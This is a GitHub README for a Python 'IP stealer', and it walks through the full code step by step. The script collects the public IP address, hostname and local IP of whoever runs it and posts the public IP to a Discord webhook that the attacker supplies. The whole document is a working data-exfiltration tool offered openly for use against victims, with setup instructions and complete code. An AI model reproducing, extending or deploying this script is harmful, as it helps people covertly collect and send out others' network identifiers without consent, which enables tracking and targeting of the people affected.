# pythonipstealer
A ip stealer made using python which sends the ip to a webhook
# How to set up 
Note you need a webhook to send the ip(s) to you.If you don't have one then you can sign up on [Discord](https://discord.com/) which is a chat app but it has webhook feature.In the code you will see a variable called  webhookURL paste it there.If you don't know how to make a discord webhook then click [here](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks) <br>
Type
``` sh 
git clone https://github.com/shourgamer2/pythonipstealer
```
Then edit the python file <br>
Import packages
``` python
# Import all the needed packages 
import socket
from requests import get
import requests
import os 
```
 Make the variables
 ``` python
 # Make the variables
ip = get('https://api.ipify.org').text
webhookURL = '' # Place your webhook url here 
hostname = socket.gethostname()    
IPAddr = socket.gethostbyname(hostname) 
```
Build the structure  of  the message  
```python 
# Build the structure  of  the message 
data = {
    'username': 'ip',
    'embeds': [{
        'title': 'ip found',
        'description': "ip " + ': ' + ip,
    }]
}
```
 Send it 
``` python
# Send it 
result = requests.post(webhookURL, json = data)

try:
    result.raise_for_status()
except:
    pass
 ```
